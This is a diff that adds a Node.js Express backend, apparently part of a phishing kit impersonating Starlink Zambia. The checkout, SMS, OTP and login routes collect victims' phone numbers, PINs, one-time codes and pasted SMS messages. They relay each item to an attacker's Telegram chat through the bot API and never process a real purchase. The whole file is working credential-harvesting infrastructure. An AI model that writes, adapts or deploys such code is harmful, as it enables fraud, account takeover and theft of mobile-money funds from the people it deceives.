@@ -1,0 +1,168 @@
+// server.js — Starlink Zambia backend (Railway)
+
+const express = require('express');
+const cors = require('cors');
+const path = require('path');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(cors());
+app.use(express.json());
+
+// ---------- Config ----------
+const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
+const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();
+
+let publicUrl = process.env.PUBLIC_URL || '';
+if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
+  publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
+}
+
+// ---------- Telegram ----------
+async function tgSend(text, retries = 3) {
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.warn('⚠️  Telegram env missing — cannot send');
+    return false;
+  }
+
+  for (let i = 0; i < retries; i++) {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        })
+      });
+      const data = await res.json();
+      if (!data.ok) {
+        console.error(`Telegram error (attempt ${i + 1}):`, data);
+        if (data.error_code === 400 || data.error_code === 401) break;
+      } else {
+        console.log('✅ Telegram message sent');
+        return true;
+      }
+    } catch (err) {
+      console.error(`Telegram send failed (attempt ${i + 1}):`, err.message);
+      if (err.cause) console.error('  Cause:', err.cause.code, '—', err.cause.message);
+      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
+    }
+  }
+  return false;
+}
+
+async function tgSetWebhook() {
+  if (!BOT_TOKEN || !publicUrl) {
+    console.warn('⚠️  Cannot register webhook — BOT_TOKEN or publicUrl missing');
+    return;
+  }
+  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
+  try {
+    console.log(`🔗 Registering webhook: ${webhookUrl}`);
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
+    const data = await res.json();
+    if (data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
+    else console.error('❌ Webhook failed:', data);
+  } catch (err) {
+    console.error('❌ Webhook error:', err.message);
+  }
+}
+
+// ---------- Plan block ----------
+function planBlock(p) {
+  return (
+    `📦 Plan: <b>${p.plan || '-'}</b>\n` +
+    `💾 Data: <b>${p.data || '-'}</b>\n` +
+    `💰 Price: <b>ZMW ${p.price ?? '-'}</b>\n` +
+    `⏱ Period: <b>${p.period || '-'}</b>\n`
+  );
+}
+
+// ---------- API routes ----------
+
+app.post('/api/checkout', async (req, res) => {
+  const { plan, data, price, period, phone, pin } = req.body || {};
+  console.log('📥 Checkout:', { plan, data, price, period, phone });
+
+  await tgSend(
+    `🛒 <b>New Checkout — Starlink Zambia</b>\n\n` +
+    planBlock({ plan, data, price, period }) +
+    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
+    `🔑 PIN: <b>${pin || '-'}</b>`
+  );
+
+  res.json({ ok: true });
+});
+
+app.post('/api/sms', async (req, res) => {
+  const { plan, data, price, period, phone, sms } = req.body || {};
+  console.log('📥 SMS:', { phone, length: (sms || '').length });
+
+  await tgSend(
+    `📩 <b>SMS Pasted — Starlink Zambia</b>\n\n` +
+    planBlock({ plan, data, price, period }) +
+    `📱 Phone: <b>+260 ${phone || '-'}</b>\n\n` +
+    `💬 <b>SMS:</b>\n<code>${(sms || '').slice(0, 3500)}</code>`
+  );
+
+  res.json({ ok: true });
+});
+
+app.post('/api/verify-otp', async (req, res) => {
+  const { plan, data, price, period, phone, otp } = req.body || {};
+  console.log('📥 OTP:', { phone, otp });
+
+  await tgSend(
+    `🔢 <b>OTP Submitted — Starlink Zambia</b>\n\n` +
+    planBlock({ plan, data, price, period }) +
+    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
+    `🔢 OTP: <b>${otp || '-'}</b>`
+  );
+
+  res.json({ ok: true });
+});
+
+// Legacy route alias — keeps older Zambia pages that POST to /api/login working
+app.post('/api/login', async (req, res) => {
+  const { phone, pin } = req.body || {};
+  console.log('📥 Login:', { phone });
+
+  await tgSend(
+    `🔐 <b>Login Attempt — Starlink Zambia</b>\n\n` +
+    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
+    `🔑 PIN: <b>${pin || '-'}</b>`
+  );
+
+  res.json({ ok: true });
+});
+
+// Webhook receiver (kept so setWebhook doesn't 404)
+app.post('/api/telegram-webhook', (req, res) => {
+  console.log('📨 Telegram update:', JSON.stringify(req.body).slice(0, 200));
+  res.sendStatus(200);
+});
+
+// Health check
+app.get('/api/health', (req, res) => {
+  res.json({ ok: true, service: 'starlink-zambia-backend', uptime: process.uptime() });
+});
+
+// ---------- Static site (optional) ----------
+// If HTML files live one level up from backend/, they'll be served.
+app.use(express.static(path.join(__dirname, '..')));
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, '..', 'index.html'));
+});
+
+// ---------- Start ----------
+app.listen(PORT, () => {
+  console.log(`🚀 Server listening on port ${PORT}`);
+  console.log(`   BOT_TOKEN set: ${BOT_TOKEN ? 'YES' : 'NO'}`);
+  console.log(`   CHAT_ID set:   ${CHAT_ID ? 'YES' : 'NO'}`);
+  tgSetWebhook();
+});
